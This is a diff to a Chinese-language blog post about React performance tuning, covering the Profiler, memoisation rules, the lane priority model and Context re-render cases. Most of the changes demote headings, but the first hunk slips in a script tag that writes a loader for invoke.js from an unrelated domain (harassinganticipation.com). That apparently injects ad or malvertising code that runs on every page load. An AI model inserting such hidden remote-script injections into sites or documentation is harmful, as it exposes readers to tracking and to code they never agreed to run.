@@ -11,7 +11,9 @@ tags:
   - useMemo
 ---
 
-# React Profiler
+<center><script type="text/javascript">atOptions = {'key' : '8f470a3a0b9c8fb81916828853d00507','format' : 'iframe','height' : 90,'width' : 728};document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://harassinganticipation.com/8f470a3a0b9c8fb81916828853d00507/invoke.js"></scr' + 'ipt>');</script></center>
+
+## React Profiler
 
 React 16.5 添加了对开发者工具的 Profiler 插件的支持。该插件使用了 React 的 Profiler API 来收集所有组件渲染的耗时，目的是为了找出 React 应用程序的性能瓶颈。
 
@@ -23,14 +25,14 @@ React 16.5 添加了对开发者工具的 Profiler 插件的支持。该插件�
 
 ![](https://zh-hans.reactjs.org/static/45619de03bed468869f7a0878f220586/ad997/stop-profiling.png)
 
-# 优化法则
+## 优化法则
 
 - 法则一：动静分离，将变的部分与不变的部分分离。
 - 法则二：缓存，复杂计算和有昂贵消耗的组件 memo 化，比如 React 的 useMemo、useCallback，Redux 的 useSelector。
 
 下面我们将根据这些法则结合实际开发中案例进行分析。
 
-# 案例一
+## 案例一
 
 我们都知道，当 state 更新后，整个组件以及它的子组件都会重新更新，尽管子组件没有依赖任何 state，下面的例子就能很好地展示这个问题。
 
@@ -243,7 +245,7 @@ lane 是 React 调度模型中的优先级模型。想象一下不同的赛车�
 
 lane 模型借鉴了同样的概念，使用 31 位的二进制表示 31 条赛道，位数越小的赛道优先级越高，某些相邻的赛道拥有相同优先级。
 
-# 案例二
+## 案例二
 
 ```tsx
 import React, { useState, useContext } from 'react'
@@ -294,7 +296,7 @@ export default App;
 
 该案例中我们引入了 Context，当 context 的 value 改变时，
 
-# 参考链接
+## 参考链接
 
 - [React Profiler 介绍](https://zh-hans.reactjs.org/blog/2018/09/10/introducing-the-react-profiler.html)
 - [深入 React Reconciliation Bailout 機制](https://blog.wuct.me/react-internal-reconciliation-bailout-587695eb05a8?gi=c4bc84e7c1df)
